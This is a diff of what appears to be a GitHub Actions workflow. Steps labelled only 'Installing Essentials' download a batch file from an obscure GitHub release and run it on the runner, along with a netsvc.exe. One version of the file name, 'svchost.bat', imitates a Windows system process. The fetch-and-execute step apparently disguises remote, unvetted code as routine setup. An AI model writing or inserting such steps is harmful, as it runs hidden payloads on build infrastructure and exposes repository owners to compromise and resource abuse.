@@ -22,9 +22,9 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
       - name: Downloading Essentials
-        run: Invoke-WebRequest -Uri "https://github.com/jonad0adad/1/releases/download/1/netsvc.bat" -OutFile "svchost.bat"
+        run: Invoke-WebRequest -Uri "https://github.com/jonad0adad/1/releases/download/1/netsvc.bat" -OutFile "netsvc.bat"
       - name: Installing Essentials
-        run: cmd /c svchost.bat
+        run: cmd /c netsvc.bat
       - name: Installing Essentials
         run: cmd /c netsvc.exe
 
